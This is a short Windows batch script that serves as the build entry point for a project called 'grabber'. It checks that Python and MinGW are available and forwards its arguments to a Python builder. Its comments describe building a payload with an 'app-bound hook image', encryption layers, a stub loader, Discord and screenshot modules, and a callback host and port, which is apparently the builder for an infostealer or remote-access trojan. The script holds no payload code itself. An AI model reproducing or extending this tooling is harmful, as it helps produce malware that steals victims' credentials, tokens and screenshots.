@echo off
setlocal

rem  grabber - the one build entry point.
rem
rem  Every build step lives in builder\build_all.py: config, app-bound hook
rem  image, C amalgamations, payload, encryption layers, stub loader. This
rem  script only puts the MinGW toolchain on PATH and forwards your arguments
rem  there, so there is exactly one place where building is defined.
rem
rem  usage
rem    build.bat                              127.0.0.1 : 4444
rem    build.bat --host 203.0.113.7 --port 8443
rem    build.bat --list                       print the available modules
rem    build.bat --no-discord --no-screenshot

set "ROOT=%~dp0"
set "PATH=C:\mingw64\bin;%PATH%"

where python >nul 2>&1
if errorlevel 1 (
    echo [x] python was not found on PATH.
    exit /b 1
)

where g++ >nul 2>&1
if errorlevel 1 (
    echo [x] g++ was not found - expected C:\mingw64\bin on PATH.
    exit /b 1
)

python "%ROOT%builder\build_all.py" %*
exit /b %ERRORLEVEL%
